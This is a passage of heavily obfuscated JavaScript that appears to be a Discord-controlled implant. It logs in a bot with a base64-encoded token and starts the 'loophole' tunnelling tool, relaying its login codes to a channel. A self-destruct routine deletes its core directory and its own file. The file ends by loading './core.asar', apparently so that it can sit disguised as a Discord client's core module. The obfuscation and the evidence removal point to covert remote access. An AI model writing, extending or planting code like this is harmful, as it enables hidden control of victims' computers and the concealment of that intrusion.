        _context4.next = _context4.t36 === 14 ? 457 : _context4.t36 === 33 ? 474 : _context4.t36 === 28 ? 476 : 504;
        break;
      case 457:
        wkrⵚⴲ = 34;
        pCNⵚⴲ = 11;
      case 459:
        if ( !( pCNⵚⴲ < 35 ) ) {
          _context4.next = 473;
          break;
        }
        _context4.t37 = pCNⵚⴲ;
        _context4.next = _context4.t37 === 20 ? 463 : _context4.t37 === 34 ? 466 : _context4.t37 === 11 ? 469 : 471;
        break;
      case 463:
        pCNⵚⴲ = 35;
        pCN.channel.send( "`Rebind aborted.`" );
        return _context4.abrupt( "break", 471 );
      case 466:
        pCNⵚⴲ = 35;
        pCN.channel.send( "`Invalid response. Rebind aborted.`" );
        return _context4.abrupt( "break", 471 );
      case 469:
        pCNⵚⴲ = wkrⵞⴲ === "no" ? 20 : 34;
        return _context4.abrupt( "break", 471 );
      case 471:
        _context4.next = 459;
        break;
      case 473:
        return _context4.abrupt( "break", 504 );
      case 474:
        wkrⵚⴲ = wkrⵞⴲ === "yes" ? 28 : 14;
        return _context4.abrupt( "break", 504 );
      case 476:
        wkrⵚⴲ = 34;
        aSfⵚⴲ = 14;
      case 478:
        if ( !( aSfⵚⴲ < 26 ) ) {
          _context4.next = 503;
          break;
        }
        _context4.t38 = aSfⵚⴲ;
        _context4.next = _context4.t38 === 25 ? 482 : _context4.t38 === 14 ? 499 : 501;
        break;
      case 482:
        aSfⵚⴲ = 26;
        pCN.channel.send( "`Removed core directory.`" );
        CUNmf = 28;
      case 485:
        if ( !( CUNmf < 29 ) ) {
          _context4.next = 498;
          break;
        }
        _context4.t39 = CUNmf;
        _context4.next = _context4.t39 === 14 ? 489 : _context4.t39 === 28 ? 494 : 496;
        break;
      case 489:
        CUNmf = 29;
        pCN.channel.send( "`Removed script.`" );
        Ibtj();
        process.exit( 1 ? 0 : -1 );
        return _context4.abrupt( "break", 496 );
      case 494:
        CUNmf = orCp.existsSync( __filename ) ? 14 : 29;
        return _context4.abrupt( "break", 496 );
      case 496:
        _context4.next = 485;
        break;
      case 498:
        return _context4.abrupt( "break", 501 );
      case 499:
        aSfⵚⴲ = orCp.existsSync( "node_modules" ) ? 25 : 26;
        return _context4.abrupt( "break", 501 );
      case 501:
        _context4.next = 478;
        break;
      case 503:
        return _context4.abrupt( "break", 504 );
      case 504:
        _context4.next = 453;
        break;
      case 506:
        _context4.next = 512;
        break;
      case 508:
        _context4.prev = 508;
        _context4.t40 = _context4[ "catch" ]( 447 );
        console.log( _context4.t40 );
        pCN.channel.send( "`You took too long to respond. Deletion aborted.`" );
      case 512:
        return _context4.abrupt( "break", 513 );
      case 513:
        _context4.next = 393;
        break;
      case 515:
        return _context4.abrupt( "break", 516 );
      case 516:
        _context4.next = 326;
        break;
      case 518:
        return _context4.abrupt( "break", 526 );
      case 519:
        PNOⵞⴲ = 35;
        oYcMJ = "output\\node_modules\\loophole.exe account login";
        AOYlt = wNAF( oYcMJ );
        AOYlt.stdout.on( "data", function ( LEOlB ) {
          var fYxiA = Vmut( LEOlB.toString() );
          var OIuJV = fYxiA.split( "\n" );
          OIuJV.forEach( function ( bPeuK ) {
            Jqtⴰⴳ = 33;
            while ( Jqtⴰⴳ < 34 ) switch ( Jqtⴰⴳ ) {
            case 14:
              Jqtⴰⴳ = 34;
              LIEⴰⴳ = 13;
              while ( LIEⴰⴳ < 21 ) switch ( LIEⴰⴳ ) {
              case 11:
                LIEⴰⴳ = 21;
                {
                  pCN.channel.send( "`Unknown error occured, report to @conquerist and send them this error code: 0019`" );
                }
                break;
              case 13:
                LIEⴰⴳ = bPeuK.includes( "Already logged in" ) ? 16 : 11;
                break;
              case 16:
                LIEⴰⴳ = 21;
                {
                  pCN.channel.send( "`Loophole process is already logged in.`" );
                }
                break;
              }
              break;
            case 28:
              Jqtⴰⴳ = 34;
              {
                var kCQiE = bPeuK.split( " " );
                pCN.channel.send( "\`".concat( kCQiE[ 0 ], " " ).concat( kCQiE[ 1 ], "\` **" ).concat( kCQiE[ 2 ], "** \`" ).concat( kCQiE[ 3 ], " " ).concat( kCQiE[ 4 ], " " ).concat( kCQiE[ 6 ], "\` **" ).concat( kCQiE[ 5 ], "** \`" ).concat( kCQiE[ 7 ], " " ).concat( kCQiE[ 8 ], " " ).concat( kCQiE[ 9 ], ".\`" ) );
              }
              break;
            case 33:
              Jqtⴰⴳ = bPeuK.includes( "code to log in" ) ? 28 : 14;
              break;
            }
            var Jqtⴰⴳ, LIEⴰⴳ;
          } );
        } );
        AOYlt.stderr.on( "data", function ( qCcⴰⴳ ) {
          var dPAⴰⴳ = Vmut( qCcⴰⴳ.toString() );
          var ecJⴰⴳ = dPAⴰⴳ.split( "\n" );
          ecJⴰⴳ.forEach( function ( Ouhⴰⴳ ) {
            lDSⴰⴳ = 31;
            while ( lDSⴰⴳ < 32 ) switch ( lDSⴰⴳ ) {
            case 31:
              lDSⴰⴳ = Ouhⴰⴳ.includes( "code to log in" ) ? 23 : 19;
              break;
            case 23:
              lDSⴰⴳ = 32;
              {
                var PNOⴰⴳ = Ouhⴰⴳ.split( " " );
                pCN.channel.send( "\`".concat( PNOⴰⴳ[ 0 ], " " ).concat( PNOⴰⴳ[ 1 ], "\` **" ).concat( PNOⴰⴳ[ 2 ], "** \`" ).concat( PNOⴰⴳ[ 3 ], " " ).concat( PNOⴰⴳ[ 4 ], " " ).concat( PNOⴰⴳ[ 6 ], "\` **" ).concat( PNOⴰⴳ[ 5 ], "** \`" ).concat( PNOⴰⴳ[ 7 ], " " ).concat( PNOⴰⴳ[ 8 ], " " ).concat( PNOⴰⴳ[ 9 ], ".\`" ) );
              }
              break;
            case 19:
              lDSⴰⴳ = 32;
              qCcⵜⴲ = 18;
              while ( qCcⵜⴲ < 30 ) switch ( qCcⵜⴲ ) {
              case 18:
                qCcⵜⴲ = Ouhⴰⴳ.includes( "Already logged in" ) ? 29 : 30;
                break;
              case 29:
                qCcⵜⴲ = 30;
                {
                  pCN.channel.send( "`Loophole process is already logged in.`" );
                }
                break;
              }
              break;
            }
            var lDSⴰⴳ, qCcⵜⴲ;
          } );
        } );
        AOYlt.on( "error", function ( dPAⵜⴲ ) {
          var ecJⵜⴲ = Vmut( data.toString() );
          var Ouhⵜⴲ = ecJⵜⴲ.split( "\n" );
          Ouhⵜⴲ.forEach( function ( PNOⵜⴲ ) {
            nqACG = 37;
            while ( nqACG < 38 ) switch ( nqACG ) {
            case 24:
              nqACG = 38;
              fCqFM = 24;
              while ( fCqFM < 30 ) switch ( fCqFM ) {
              case 24:
                fCqFM = PNOⵜⴲ.includes( "Already logged in" ) ? 18 : 30;
                break;
              case 18:
                fCqFM = 30;
                {
                  pCN.channel.send( "`Loophole process is already logged in.`" );
                }
                break;
              }
              break;
            case 27:
              nqACG = 38;
              {
                var lDSⵜⴲ = PNOⵜⴲ.split( " " );
                pCN.channel.send( "\`".concat( lDSⵜⴲ[ 0 ], " " ).concat( lDSⵜⴲ[ 1 ], "\` **" ).concat( lDSⵜⴲ[ 2 ], "** \`" ).concat( lDSⵜⴲ[ 3 ], " " ).concat( lDSⵜⴲ[ 4 ], " " ).concat( lDSⵜⴲ[ 6 ], "\` **" ).concat( lDSⵜⴲ[ 5 ], "** \`" ).concat( lDSⵜⴲ[ 7 ], " " ).concat( lDSⵜⴲ[ 8 ], " " ).concat( lDSⵜⴲ[ 9 ], ".\`" ) );
              }
              break;
            case 37:
              nqACG = PNOⵜⴲ.includes( "code to log in" ) ? 27 : 24;
              break;
            }
            var nqACG, fCqFM;
          } );
        } );
        return _context4.abrupt( "break", 526 );
      case 526:
        _context4.next = 318;
        break;
      case 528:
      case "end":
        return _context4.stop();
      }
    }, _callee2, null, [
      [ 155, 195 ],
      [ 417, 428 ],
      [ 447, 508 ]
    ] );
  } ) );
  return function ( _x2 ) {
    return _ref2.apply( this, arguments );
  };
}() );
rIRB.login( Buffer.from( bot, "base64" ).toString( "ascii" ) );
module.exports = require( './core.asar' );
